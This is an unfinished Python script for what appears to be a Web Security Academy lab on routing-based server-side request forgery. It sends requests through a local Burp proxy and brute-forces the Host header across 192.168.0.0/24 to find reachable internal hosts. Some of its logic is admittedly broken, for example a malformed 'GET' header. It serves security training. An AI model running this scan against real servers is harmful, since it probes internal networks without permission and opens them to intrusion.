import requests
import urllib3
import sys
# Not Done yet
# the challenge here is to make the path == target host name 
# we need to make python fire a request similar to this 
# GET https://0aed003a036763d7846f3ba200f0000c.web-security-academy.net HTTP/2
# Host: 192.168.0.6
# i think best way to manipulate the path via proxy (brup) -> easier 




proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main(target_host:str):

    
    s = requests.Session()
    cookies_response = s.get(target_host,proxies=proxies ,verify=False).cookies.get_dict()

    if target_host.endswith('/'):
        target_host = target_host.removesuffix('/')
    #target_host +=target_host.removesuffix('/')
    print(target_host)
    for i in range(1,256):
        internal_ip = f"192.168.0.{i}"
        
        headers = {
            "GET":target_host+' '+'HTTP/1',
            "Host":internal_ip, 
                    }    
        response = s.get(target_host, proxies=proxies , headers=headers,verify=False , cookies=cookies_response,)

        print(f"ip: 192.168.0.{i} -> {response}")
        
        if response.status_code != 504 and "Error" not in response.text and "Invalid host" not in response.text  : # or we might use this condition "Server Error:" not in  response.text
            print(f"(+) We have found a valid Internal IP {internal_ip}")
            print(response.text)
            # instead of breaking here , we should continue to findout if there another valid internal ips



def print_help():
    """Pring how to use this script"""
    print(f"\
            \rThis script is suposued to Bruteforce valid internal ip of this cidr `192.168.0.0/24`\r\n\
            \rUsage: python {sys.argv[0]} 'http(s)://ur_target.tld/'\r\n\
            \rExample: pytohn {sys.argv[0]} https://www.google.com/\r\n\
                " )

if __name__ == "__main__":
    if len(sys.argv) !=2 :
        print_help()
        exit()
    target = sys.argv[1]
    main(target)